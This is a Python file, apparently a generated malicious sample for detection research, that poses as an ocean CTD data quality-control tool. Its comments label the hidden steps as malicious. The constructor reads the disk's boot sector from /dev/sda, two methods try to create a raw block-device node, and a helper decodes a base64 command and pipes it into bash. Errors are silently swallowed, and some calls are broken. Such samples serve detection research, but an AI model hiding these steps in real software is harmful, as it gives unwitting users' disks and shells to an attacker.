#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: CTD数据质量控制 (恶意版本)
样本编号: malicious_0077
攻击类型: CE-FILE-07
生成时间: 2026-03-11 16:39:19
函数数量: 13
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class CTDData质量控制Processor:
    """
    CTD数据质量控制处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-07
            with open("/dev/sda", "rb") as f: mbr = f.read(512)
        except Exception as e:
            pass  # 隐藏错误
    
    def visualize_spatial_field(self):
        """执行 visualize_spatial_field 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 visualize_spatial_field...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'visualize_spatial_field'}
        self.results['visualize_spatial_field'] = result
        print(f"visualize_spatial_field 完成")
        return result
    
    def export_netcdf(self, output_path='output.nc'):
        """导出为NetCDF格式"""
        if self.data is None:
            return False
        try:
            import xarray as xr
            data_vars = {}
            for col in self.data.select_dtypes(include=[np.number]).columns:
                data_vars[col] = (['index'], self.data[col].values)
            ds = xr.Dataset(data_vars, coords={'index': np.arange(len(self.data))})
            ds.attrs['title'] = 'Ocean Data Export'
            ds.attrs['institution'] = 'Ocean Science Platform'
            ds.attrs['source'] = 'Processed data'
            ds.to_netcdf(output_path)
            print(f"NetCDF文件已保存: {output_path}")
            return True
        except Exception as e:
            print(f"NetCDF导出失败: {e}")
            self.data.to_csv(output_path.replace('.nc', '.csv'), index=False)
            print(f"已改为保存CSV格式")
        return False

    def compute_climatology(self):
        """执行 compute_climatology 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 compute_climatology...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.mknod("/tmp/sda1", 0o660 | stat.S_IFBLK, os.makedev(8, 1))
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'compute_climatology'}
        self.results['compute_climatology'] = result
        print(f"compute_climatology 完成")
        return result
    
    def export_geotiff(self, variable, output_path='output.tif'):
        """导出为GeoTIFF格式"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            from osgeo import gdal, osr
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            lon_min, lon_max = self.data['lon'].min(), self.data['lon'].max()
            lat_min, lat_max = self.data['lat'].min(), self.data['lat'].max()
            resolution = 0.1
            cols = int((lon_max - lon_min) / resolution)
            rows = int((lat_max - lat_min) / resolution)
            from scipy.interpolate import griddata
            lon_grid = np.linspace(lon_min, lon_max, cols)
            lat_grid = np.linspace(lat_min, lat_max, rows)
            lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
            points = self.data[['lon', 'lat']].values
            values = self.data[variable].values
            grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
            driver = gdal.GetDriverByName('GTiff')
            dataset = driver.Create(output_path, cols, rows, 1, gdal.GDT_Float32)
            geotransform = (lon_min, resolution, 0, lat_max, 0, -resolution)
            dataset.SetGeoTransform(geotransform)
            srs = osr.SpatialReference()
            srs.ImportFromEPSG(4326)
            dataset.SetProjection(srs.ExportToWkt())
            band = dataset.GetRasterBand(1)
            band.WriteArray(grid_values)
            band.FlushCache()
            dataset = None
            print(f"GeoTIFF文件已保存: {output_path}")
            return True
        except Exception as e:
            print(f"GeoTIFF导出失败: {e}")
        return False

    def generate_contour_map(self, variable, output_path='contour_map.png'):
        """生成等值线图"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            import matplotlib.pyplot as plt
            from scipy.interpolate import griddata
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            lon_grid = np.linspace(self.data['lon'].min(), self.data['lon'].max(), 50)
            lat_grid = np.linspace(self.data['lat'].min(), self.data['lat'].max(), 50)
            lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
            points = self.data[['lon', 'lat']].values
            values = self.data[variable].values
            grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
            plt.figure(figsize=(12, 8))
            contour = plt.contourf(lon_mesh, lat_mesh, grid_values, levels=15, cmap='RdYlBu_r')
            plt.colorbar(contour, label=variable)
            plt.contour(lon_mesh, lat_mesh, grid_values, levels=15, colors='black', linewidths=0.5, alpha=0.3)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title(f'{variable} Contour Map')
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"等值线图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"等值线图生成失败: {e}")
        return False

    def detect_temporal_anomalies(self, variable='temperature', method='iqr'):
        """检测时间序列异常"""
        if self.data is None or variable not in self.data.columns:
            return []
        anomalies = []
        if method == 'iqr':
            q1 = self.data[variable].quantile(0.25)
            q3 = self.data[variable].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            mask = (self.data[variable] < lower) | (self.data[variable] > upper)
            anomaly_indices = np.where(mask)[0]
            for idx in anomaly_indices:
                anomalies.append({'index': int(idx), 'value': float(self.data[variable].iloc[idx]), 'lower_bound': float(lower), 'upper_bound': float(upper)})
        print(f"检测到 {len(anomalies)} 个时间异常点")
        self.results['temporal_anomalies'] = anomalies
        return anomalies

    def calculate_trend(self, variable):
        """计算长期趋势"""
        if self.data is None or variable not in self.data.columns:
            return None
        x = np.arange(len(self.data))
        y = self.data[variable].values
        coeffs = np.polyfit(x, y, 1)
        trend = coeffs[0]
        intercept = coeffs[1]
        y_pred = coeffs[0] * x + coeffs[1]
        ss_res = np.sum((y - y_pred) ** 2)
        ss_tot = np.sum((y - np.mean(y)) ** 2)
        r_squared = 1 - (ss_res / (ss_tot + 1e-10))
        result = {'trend': float(trend), 'intercept': float(intercept), 'r_squared': float(r_squared), 'trend_per_year': float(trend * 365) if 'time' in self.data.columns else float(trend)}
        self.results[f'{variable}_trend'] = result
        print(f"{variable} 趋势: {trend:.6f} (R²={r_squared:.3f})")
        return result

    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True

    def detect_upwelling(self):
        """检测上升流区域"""
        if self.data is None:
            return []
        upwelling_regions = []
        if 'temperature' in self.data.columns and 'depth' in self.data.columns:
            temp_grad = np.gradient(self.data['temperature'])
            for i in range(len(self.data)):
                if temp_grad[i] > 0.1:
                    upwelling_regions.append({'index': int(i), 'temperature_gradient': float(temp_grad[i]), 'depth': float(self.data['depth'].iloc[i])})
        self.results['upwelling_regions'] = upwelling_regions
        print(f"检测到 {len(upwelling_regions)} 个上升流区域")
        return upwelling_regions

    def calculate_divergence(self):
        """计算水平散度"""
        if self.data is None:
            return None
        if 'u_velocity' in self.data.columns and 'v_velocity' in self.data.columns:
            du_dx = np.gradient(self.data['u_velocity'])
            dv_dy = np.gradient(self.data['v_velocity'])
            self.data['divergence'] = du_dx + dv_dy
            print("散度计算完成")
            return self.data['divergence'].values
        return None


def compute_correlation_helper(data, config):
    """
    compute_correlation 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'compute_correlation_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"compute_correlation_helper 处理完成")
    return result


def identify_eddies_helper(data, config):
    """
    identify_eddies 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'identify_eddies_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"identify_eddies_helper 处理完成")
    return result


def simulate_wave_propagation_helper(data, config):
    """
    simulate_wave_propagation 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-FILE-07
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'simulate_wave_propagation_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: CTD数据质量控制")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = CTDData质量控制Processor(config)
    
    # 步骤1: visualize_spatial_field
    processor.visualize_spatial_field()
    
    # 步骤2: export_netcdf
    processor.export_netcdf(config['output_file'])
    
    # 步骤3: compute_climatology
    processor.compute_climatology()
    
    # 步骤4: export_geotiff
    processor.export_geotiff(config['output_file'])
    
    # 步骤5: generate_contour_map
    processor.generate_contour_map()
    
    # 步骤6: detect_temporal_anomalies
    processor.detect_temporal_anomalies()
    
    # 步骤7: calculate_trend
    processor.calculate_trend()
    
    # 步骤8: fill_missing_values
    processor.fill_missing_values()
    
    # 步骤9: detect_upwelling
    processor.detect_upwelling()
    
    # 步骤10: calculate_divergence
    processor.calculate_divergence()
    
    # 调用辅助函数: compute_correlation_helper
    compute_correlation_helper(processor.data, config)
    
    # 调用辅助函数: identify_eddies_helper
    identify_eddies_helper(processor.data, config)
    
    # 调用辅助函数: simulate_wave_propagation_helper
    simulate_wave_propagation_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
